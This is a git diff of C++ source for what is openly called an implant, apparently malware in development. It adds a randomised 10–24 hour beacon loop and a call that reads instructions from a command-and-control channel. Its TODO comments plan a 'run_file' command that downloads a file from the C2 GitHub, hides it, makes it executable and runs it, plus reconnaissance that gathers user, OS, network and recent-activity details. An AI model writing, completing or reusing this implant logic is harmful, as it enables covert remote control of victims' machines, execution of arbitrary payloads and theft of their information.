@@ -1,5 +1,12 @@
 // the application core class
 
+/*
+ * references:
+ *
+ * - random numbers: https://www.w3schools.com/cpp/cpp_howto_random_number.asp
+ *
+ * */
+
 #include "core.h"
 #include <iostream>
 #include <string>
@@ -27,9 +34,9 @@ void Core::loop() {
     /* TODO
      * at this point, the implant has established C2 communication (over TLS), and the initial persistence routines have run;
      *
-     * 1. establish a loop to reach back out to the C2 channel once every 24 hours at a random interval throughout the day:
+     * 1. establish a loop to reach back out to the C2 channel once every 10-24 hours at a random interval:
      *      - confirm contact via contact.txt
-     *      - decode and read instruction       -> instruction should be of the form: COMMAND : file_to_stage
+     *      - decode and read instruction
      *      - supported instructions:
      *              - run_file : file.type      -> grab the indicated file off of the C2 GH, write it to a hidden file, render it executable, and start it as a process
      *              - light_reconnaissance      -> grab current userid, username, kernel and OS versions, network interfaces, and recent user activity
@@ -43,7 +50,6 @@ void Core::loop() {
     */
     // if (established_persistence_count < 1) {scheduled_job_persistence();}
     while (1) {
-        // random numbers: https://www.w3schools.com/cpp/cpp_howto_random_number.asp
         srand(time(0));
         int random_interval = rand() % 14;                                  // random number between 0 and 14
         random_interval = random_interval + 10;                             // makes it a random number between 10 and 24
@@ -53,6 +59,8 @@ void Core::loop() {
         if (contact_file_contents == "contact has been established.") {
             std::cout << "[+] Contact has been established within the C2 loop.\n";
         }
+        std::string current_instruction = read_c2_message("instruction.txt");
+        std::cout << "[+] Current instruction: " << current_instruction << '\n';
     }
 }
                                             // The TLS encryption of this request has been confirmed with Wireshark
